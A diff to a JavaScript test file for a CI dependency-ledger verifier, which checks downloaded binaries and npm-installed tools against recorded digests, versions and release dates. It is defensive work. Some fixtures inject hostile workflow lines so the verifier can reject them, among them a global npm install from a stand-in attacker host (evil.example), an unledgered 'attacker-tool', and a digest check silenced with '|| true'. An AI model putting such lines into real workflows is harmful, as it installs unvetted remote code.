@@ -144,8 +144,12 @@ test("only the documented first-party repository can claim the age exception", a
 
 test("remote evidence binds action tags and npm versions to recorded dates", async () => {
   const policy = await loadDependencyPolicy(ROOT);
-  const fetchImpl = async (input) => {
+  const fetchImpl = async (input, init) => {
     const url = String(input);
+    // The GitHub token authenticates GitHub calls only; the npm registry
+    // never receives it.
+    if (new URL(url).hostname === "api.github.com") assert.equal(init?.headers?.Authorization, "Bearer not-a-secret", `token sent to ${url}`);
+    else assert.equal(init?.headers?.Authorization, undefined, `no token to ${url}`);
     if (url.includes("api.github.com/advisories")) {
       const parsed = new URL(url);
       const advisoryId = parsed.pathname.startsWith("/advisories/")
@@ -176,6 +180,13 @@ test("remote evidence binds action tags and npm versions to recorded dates", asy
       });
     }
     if (url.includes("api.github.com/repos/")) {
+      // A ledger binary's release is asked for its publication date the same
+      // way an action's tag is, so the stub answers from either record.
+      const binary = Object.entries(policy.binaries ?? {}).find(([, entry]) => {
+        const parsed = /^https:\/\/github\.com\/([^/]+\/[^/]+)\/releases\/download\/([^/]+)\//.exec(entry.url ?? "");
+        return parsed !== null && url === `https://api.github.com/repos/${parsed[1]}/releases/tags/${parsed[2]}`;
+      });
+      if (binary) return Response.json({ published_at: binary[1].published });
       const action = Object.entries(policy.actions).find(([repo]) => url.includes(`/repos/${repo}/`));
       assert.ok(action, `known action URL: ${url}`);
       const [, record] = action;
@@ -186,7 +197,7 @@ test("remote evidence binds action tags and npm versions to recorded dates", asy
       });
     }
     const name = decodeURIComponent(new URL(url).pathname.slice(1));
-    const record = policy.packages[name] ?? policy.transitivePins[name];
+    const record = policy.packages[name] ?? policy.transitivePins[name] ?? policy.tools?.[name];
     assert.ok(record, `known package URL: ${url}`);
     const time = { [record.version]: record.published };
     if (name === "fast-uri") time["3.1.4"] = record.published;
@@ -206,10 +217,102 @@ test("remote evidence binds action tags and npm versions to recorded dates", asy
     if (url.includes("/repos/actions/checkout/commits/")) return Response.json({ sha: "0".repeat(40) });
     return await fetchImpl(input, init);
   };
+  // A binary cannot vouch for its own age: a backdated ledger date is caught
+  // against the release the recorded URL names.
+  const backdatedFetch = async (input, init) => {
+    const url = String(input);
+    if (url.includes("/repos/cloudflare/cloudflared/releases/tags/")) return Response.json({ published_at: "2020-01-01T00:00:00Z" });
+    return await fetchImpl(input, init);
+  };
   await assert.rejects(
-    verifyRemoteDependencyPolicy(policy, { fetchImpl: badFetch }),
+    verifyRemoteDependencyPolicy(policy, { fetchImpl: backdatedFetch, token: "not-a-secret" }),
+    (error) => error instanceof Error && error.message.includes("cloudflared: release date does not match the ledger"),
+  );
+  await assert.rejects(
+    verifyRemoteDependencyPolicy(policy, { fetchImpl: badFetch, token: "not-a-secret" }),
     (error) => error instanceof Error
       && error.message.includes(`actions/checkout: ${policy.actions["actions/checkout"].tag} does not resolve to the ledger SHA`),
   );
 
+});
+
+test("a binary a workflow downloads is bound to the ledger by URL, digest, version, and age", async (t) => {
+  await t.test("digest drift", async () => {
+    const root = await fixture();
+    const policy = await loadDependencyPolicy(root);
+    const record = policy.binaries.cloudflared;
+    await replace(join(root, ".github/workflows/live.yml"), `echo "${record.sha256}  `, `echo "${"0".repeat(64)}  `);
+    await assert.rejects(verifyLocalDependencyPolicy(root, NOW), /cloudflared digest does not match the ledger/);
+  });
+  await t.test("undeclared download", async () => {
+    const root = await fixture();
+    const policy = await loadDependencyPolicy(root);
+    await replace(join(root, ".github/workflows/live.yml"), policy.binaries.cloudflared.url, policy.binaries.cloudflared.url.replace("2026.7.3", "2026.7.2"));
+    await assert.rejects(verifyLocalDependencyPolicy(root, NOW), /is missing from the ledger|is not downloaded by any workflow/);
+  });
+  await t.test("quarantine", async () => {
+    const root = await fixture();
+    const policy = await loadDependencyPolicy(root);
+    const young = new Date(NOW.getTime() - DAY_MS).toISOString();
+    await replace(join(root, "docs/dependency-ledger.md"), `"published": "${policy.binaries.cloudflared.published}"`, `"published": "${young}"`);
+    await assert.rejects(verifyLocalDependencyPolicy(root, NOW), (error) => error instanceof Error && error.message.includes(`cloudflared: ${young} is younger than`));
+  });
+});
+
+test("a tool a workflow installs with npm is bound to the ledger by name, version, and age", async (t) => {
+  await t.test("version drift", async () => {
+    const root = await fixture();
+    const policy = await loadDependencyPolicy(root);
+    const record = policy.tools["@openai/codex"];
+    await replace(join(root, ".github/workflows/live.yml"), `@openai/codex@${record.version}`, "@openai/codex@0.0.1");
+    await assert.rejects(verifyLocalDependencyPolicy(root, NOW), /@openai\/codex@0\.0\.1 does not match ledger/);
+  });
+  await t.test("undeclared install", async () => {
+    const root = await fixture();
+    const policy = await loadDependencyPolicy(root);
+    const record = policy.tools["@openai/codex"];
+    await replace(join(root, ".github/workflows/live.yml"), `@openai/codex@${record.version}`, `@openai/codex-cli@${record.version}`);
+    await assert.rejects(verifyLocalDependencyPolicy(root, NOW), (error) => error instanceof Error
+      && error.message.includes("installed tool @openai/codex-cli is missing from the ledger")
+      && error.message.includes("@openai/codex: ledger tool is not installed by any workflow"));
+  });
+  await t.test("quarantine", async () => {
+    const root = await fixture();
+    const policy = await loadDependencyPolicy(root);
+    const young = new Date(NOW.getTime() - DAY_MS).toISOString();
+    await replace(join(root, "docs/dependency-ledger.md"), `"published": "${policy.tools["@anthropic-ai/claude-code"].published}"`, `"published": "${young}"`);
+    await assert.rejects(verifyLocalDependencyPolicy(root, NOW), (error) => error instanceof Error && error.message.includes(`@anthropic-ai/claude-code: ${young} is younger than`));
+  });
+  await t.test("another spelling of a global install is bound too", async () => {
+    const root = await fixture();
+    await replace(join(root, ".github/workflows/live.yml"), "      - name: rehearse", "      - run: npm i --global attacker-tool@1.0.0\n      - name: rehearse");
+    await assert.rejects(verifyLocalDependencyPolicy(root, NOW), /installed tool attacker-tool is missing from the ledger/);
+  });
+  await t.test("an unpinned global install is refused", async () => {
+    const root = await fixture();
+    const policy = await loadDependencyPolicy(root);
+    await replace(join(root, ".github/workflows/live.yml"), `@openai/codex@${policy.tools["@openai/codex"].version}`, "@openai/codex@latest");
+    await assert.rejects(verifyLocalDependencyPolicy(root, NOW), /@openai\/codex@unpinned does not match ledger/);
+  });
+  await t.test("a spec the parser cannot read is refused, never skipped", async () => {
+    const root = await fixture();
+    await replace(join(root, ".github/workflows/live.yml"), "      - name: rehearse", "      - run: npm install -g https://evil.example/pkg.tgz\n      - name: rehearse");
+    await assert.rejects(verifyLocalDependencyPolicy(root, NOW), /installed tool https:\/\/evil\.example\/pkg\.tgz is missing from the ledger/);
+  });
+  await t.test("a digest line that checks another file, or discards its result, does not count", async () => {
+    for (const [from, to] of [
+      ['  $RUNNER_TEMP/cloudflared" | sha256sum -c -', '  $RUNNER_TEMP/other-file" | sha256sum -c -'],
+      ['| sha256sum -c -\n', "| sha256sum -c - || true\n"],
+    ]) {
+      const root = await fixture();
+      await replace(join(root, ".github/workflows/live.yml"), from, to);
+      await assert.rejects(verifyLocalDependencyPolicy(root, NOW), /cloudflared is downloaded without a digest check/);
+    }
+  });
+  await t.test("a release asset fetched without its digest line is refused", async () => {
+    const root = await fixture();
+    await replace(join(root, ".github/workflows/live.yml"), "      - name: rehearse",
+      "      - run: wget -O /tmp/x https://github.com/cloudflare/cloudflared/releases/download/2026.7.3/cloudflared-linux-amd64\n      - name: rehearse");
+    await assert.rejects(verifyLocalDependencyPolicy(root, NOW), /cloudflared is downloaded without a digest check/);
+  });
 });
